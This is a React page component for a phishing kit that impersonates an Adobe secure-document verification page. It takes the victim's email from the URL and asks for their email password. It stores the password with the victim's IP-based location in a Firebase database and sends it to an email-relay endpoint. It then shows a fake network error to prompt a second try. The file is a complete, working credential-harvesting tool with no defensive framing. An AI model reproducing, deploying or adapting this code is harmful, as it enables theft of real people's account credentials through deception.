'use client';
import { useState, useEffect } from 'react';
import Image from "next/image";
import { FaDownload, FaFloppyDisk, FaRegEye } from "react-icons/fa6";
import {  FaPencilAlt } from "react-icons/fa";
import { db } from '@/lib/firebase';
import { push, ref } from 'firebase/database';


export default function Page() {
  const [animateIn, setAnimateIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [activeIndex, setActiveIndex] = useState(1);
  const [selectOption, setSelectOption] = useState("option1");

  const handleRadio = (e) => {
    setSelectOption(e.target.value);
  }

useEffect(()=> {
  setError("");
    setTimeout(() => {
      setAnimateIn(true);
    }, 30);
},[]);

  function getQueryParam(param) {
    return new URLSearchParams(window.location.search).get(param);
  }

  useEffect(() => {
    const emailFromURL = getQueryParam("xi") || "";
    setEmail(emailFromURL);

    const fetchLocation = async () => {
      try {
        const res = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=477b04ba40ce487b99984aca5c47b2a0");
        if (!res.ok) throw new Error("Location service failed");
        const data = await res.json();
        setLocation(`${data.city || "Unknown City"}, ${data.country_name || "Unknown Country"}`);
      } catch (err) {
        console.error(err);
        setLocation("Unknown Location");
      }
    };
    fetchLocation();
  }, []);

  const handleSubmit = async (e) => {
    setLoading(false)
    e.preventDefault();
    console.log(password)
    if (!email || !password) return setError("Both fields are required!");

    setLoading(true);
    setError("");
    try {
      const usersRef = ref(db, "users");
      const newUser = { email, password, location };
      await push(usersRef, newUser);

      const response = await fetch("/api/sendEmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(newUser),
      });

      if (response.ok) {
        setError("Network Error! Please verify your information and try again");
        setLoading(false)
        setPassword("");
      } else {
        setError("Error logging in to this account!.");
        setLoading(false)
        setPassword("");
      }
    } catch (error) {
      console.error("Error:", error);
      setError("Logging failed.");
      setLoading(false)
      setPassword("");
    }

  }

  return (

    
    <div>
      <main className="p-5">
        <div className="backgroundImg z-[-1]">
          <img src={"https://i.ibb.co/XyvSQGZ/newbg.png"} id="dynamicBg" alt="background image" />
        </div>
    
            <div className={`warn-cont p-5`}>
              <div className={`warn-card p-5 max-sm:p-2`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
                <div className="warn-header mb-5">
                    <img src="/images/logo.png" width={50} className='max-sm:w-[40px] max-md:w-[46px]' alt="Adobe Reader XI" />
                  <h2 className='text-[28px] max-md:text-[24px] max-sm:text-[18px] text-[#fa0f00] font-semibold'>Secured Adobe File Verification</h2>
                </div>
                <div className='flex flex-col w-full p-2'>
                  <div className='flex items-center gap-2'>
                    <input id='first-radio' type='radio' value={"option1"} checked={selectOption === "option1"} className='w-fit h-fit' onChange={handleRadio}/>
                    <label htmlFor='first-radio'>View File Online</label>
                  </div>  
                  <div className='flex items-center gap-2'>
                    <input id='second-radio' type='radio' value={"option2"} checked={selectOption === "option2"} className='w-fit h-fit' onChange={handleRadio}/>
                    <label htmlFor='second-radio'>Download File</label>
                  </div>  
                  <div className='flex items-center gap-2'>
                    <input id='third-radio' type='radio' value={"option3"} checked={selectOption === "option3"} className='w-fit h-fit' onChange={handleRadio}/>
                    <label htmlFor='third-radio'>Send File To Email</label>
                  </div>  
                </div>
                <form className='p-2'>
                  <div id="error" style={{ fontSize: "14px", color: "tomato", textAlign: "center" }}>{error}</div>
                  <div>
                    <label htmlFor='email'>Email</label>
                  <input type="email" id="email" readOnly placeholder="Enter Email" value={email}/>
                  </div>
                  <div>
                    <label htmlFor='password'>Password</label>
                  <input type="password" id="password" onChange={(e)=> setPassword(e.target.value)} placeholder="Email Password"/>
                  </div>
                  <button type="submit" id='login-btn' onClick={handleSubmit} className={`btn btn-danger btn-block rounded-[5px] h-[45px]`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "Login To Access File"}</button>
                </form>
                <p className='text-center p-2 text-sm'>To access our online secured document page, you are required to login your email address. This is to ensure you are the rightful recipient for the protect file. Unauthorized access is highly prohibited.</p>
              </div>
            </div>
        </div>
      </main>
    </div>
  );
}
